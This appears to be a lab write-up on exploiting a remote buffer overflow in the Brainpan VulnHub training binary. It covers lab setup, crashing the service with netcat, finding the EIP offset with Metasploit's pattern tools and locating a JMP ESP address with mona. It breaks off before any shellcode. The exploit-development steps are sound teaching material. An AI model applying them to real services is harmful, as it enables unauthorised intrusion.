# Remote Buffer Overflow
A remote buffer overflow is a way of passing input into a remote handler than does not check the size before allocating that input to a symbol, or variable. Below we will do a simple excerise that is part of the [Brainpan VulnHUB VM]() exercise.
## Install Windows VM
### Download the Windows 7 VM
You can download the Windows 7 (64bit) VM [from Microsoft directly](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/).
### Install Immunity Debugger
You can download the Immunity Debugger application that we will use to analyze what the application is doing [from here.](https://www.immunityinc.com/products/debugger/)
### Disable the Windows VM FW
For ICMP and HTTP requests to work from our attacker machine to our Windows 7 box, we will need to first diable the firewall on the Windows VM. You will recognize the issue when you try to ping the Attacker machine from the Windows VM, then vice versa. The latter will not work out-of-the-box.
## Running Brainpan Locally
Get the `brainpan.exe` file from the brainpan VM via HTTP. You will have to enumerate the file. Then styart up the brainpan service in the Windows VM. Now, we have a vulnerable platform to attck from our attacker system. We will use this environment to design our working exploit, then run it against the actual Linux Brainpan server.
## Crash Brainpan
Next, we need to crash Brainpan.exe remotely. We can do this by using Python to create a long string of "A" bytes, which are 0x41 in hexadecimal. Then, pass the string of "A" bytes as the "PASSWORD" to Brainpan.exe via a Netcat connection.
```
root@attacker:~# python -c 'print "A" * 1024;'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
root@attacker:~# nc (TARGET IP ADDRESS) 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
```
After sending this many "A"s to the Brainpan.exe service, it will crash and in Immunity Debugger, we will see that the EIP register is overwritten with `41414141` which is four 0x41 bytes, or "A" in ASCII. 
## Control EIP
Next, we need write control over the EIP pointer CPU register. We already know we can do this by overwriting the buffer with "A"s until EIP says `41414141` as shown in the previous step. Now, we need to know exactly where it is. To do so, we will use a Metasploit module, `create_pattern.rb` ruby script.
```
root@attacker-machine:~# /infosec/exploitation/metasploit-framework/tools/exploit/pattern_create.rb -l 1024
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B

```
Now, we pass this as input from our Attacker machine into the remote Brainpan.exe service on our Windows machine and view the EIP regitser data after Brainpan.exe crashes. 
```
nc (TARGET IP ADDRESS) 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae ...
```
In my case the EIP was overwritten with `35724134`. Now, we need to find that offset using the `pattern_offset.rb` ruby script in the Metasploit Framework as shown,
```
root@attacker-machine:~# /infosec/exploitation/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
[*] Exact match at offset 524
```
Great news, we can now overwrite and control EIP by sending creating a new overflow string in Python as follows,
```
root@attacker-machine:~# python -c 'print "A" * 524 + "ABCD" + "A" * (1024 - 524 - 4);'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... 
root@attacker-machine:~# echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... | wc -c
1024
```
As you can see, this embedded a new substring at offset of 524 bytes of "ABCD" and then re-filled the rest of the bytes to equal 1024 total again. Now, if we send this to the Brainpan.exe service on our Windows VM from our Attacker VM, the EIP should say "ABCD" backwards in hexadecimal format as so, `44434241`

## Find the ESP
Next, we need to find out where in the application we have a `JMP ESP` Assemblyt instruction. But before we search Brainpan.exe for that instruction, we need the "byte code" format of the instruction. This is the hexadecimal representation of the Assembly instruction that the CPU reads. We can do this with the `nasm_shell` utility in Metasploit Framework.
```
root@attacker:~# /infosec/exploitation/metasploit-framework/tools/exploit/nasm_shell.rb
nasm> jmp esp
00000000  FFE4      jmp esp
```
Great, this is `\xff\xe4` as shown as the second column of the listing output from `nmap_shell.rb` above. Go back to the Windows VM and restart Brainpan.exe in Immunity Debugger and in the bottom left input box, use the following command to find the address of `JMP ESP` in the binary,
```
!mona find -s "\xff\xe4" -m brainpan.exe
```
This will give you the output in a new window. For me, this new address was `0x311712fe`. 
